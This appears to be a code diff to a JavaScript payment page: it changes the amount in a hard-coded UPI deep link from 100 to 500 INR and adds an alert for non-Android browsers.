@@ -63,7 +63,7 @@ function startCountdown() {
 function Payment(app) {
   if ("vibrate" in navigator) navigator.vibrate(200);
 
-  const baseUPI = "upi://pay?pa=mann06@fam&pn=Payment&am=100&cu=INR";
+  const baseUPI = "upi://pay?pa=mann06@fam&pn=Payment&am=500&cu=INR";
   let upiURL = baseUPI;
 
   if (app === "PayTM") {
@@ -74,9 +74,14 @@ function Payment(app) {
     upiURL += "&mc=0000&mode=05&orgid=000000";
   }
 
+  // Fallback message
+  if (!navigator.userAgent.includes("Android")) {
+    alert("⚠️ This only works on Android phones with UPI apps installed.");
+    return;
+  }
+
   window.location.href = upiURL;
 }
-
 document.addEventListener('keydown', (e) => {
   if (e.key === 'F11' || e.key === 'Escape') {
     document.exitFullscreen();More actions
